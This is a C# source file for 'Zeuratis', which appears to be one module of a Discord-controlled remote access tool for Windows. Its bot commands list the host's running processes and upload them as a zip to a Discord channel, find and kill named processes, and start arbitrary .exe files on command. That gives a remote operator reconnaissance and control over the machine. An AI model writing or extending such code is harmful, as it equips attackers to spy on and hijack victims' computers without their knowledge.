namespace Zeuratis;

[SupportedOSPlatform("windows")]
public class ProcCommands : ModuleBase<SocketCommandContext>
{
    [Command("ListProcs")]
    public async Task GetProcs()
    {    
        String procs = "";

        foreach (Process proc in Process.GetProcesses())
        {
            procs += proc.ProcessName + "\n\n";
        }
        File.WriteAllText("tempfile\\ProcList.txt", procs);
        ZipFile.CreateFromDirectory("tempfile", "ProcList.zip");

        await Context.Channel.SendFileAsync("ProcList.zip");
        File.Delete("ProcList.zip");

        Zeuratis.ClearTemp();
    }

    [Command("FindProc")]
    public async Task FindProc(String procName)
    {
        foreach (Process proc in Process.GetProcesses())
        {
            if (proc.ProcessName == procName)
            {
                await ReplyAsync(embed: new EmbedBuilder
                {
                    Description = $"Found process : {procName}"
                }.Build());

                return;
            }
        }

        await ReplyAsync($"No process by the name of > {procName} < found");
    }

    [Command("KillProc")]
    public async Task KillProc(String procName)
    {
        foreach (Process proc in Process.GetProcesses())
        {
            if (proc.ProcessName == procName)
            {
                proc.Kill();

                await ReplyAsync(embed: new EmbedBuilder
                {
                    Description = $"Killed process : {procName}",
                }.Build());

                return;
            }
        }

        await ReplyAsync($"No process by the name of > {procName} < found");
    }

    [Command("StartProc")]
    public async Task StartProc(String procPath)
    {
        if (!File.Exists(procPath))
        {
            await ReplyAsync("File path not found");
        }
        else if (!procPath.EndsWith(".exe"))
        {
            await ReplyAsync("File path does not lead to a exe file");
        }
        else
        {
            Process.Start(procPath);

            await ReplyAsync("Started process");
        }
    }
}
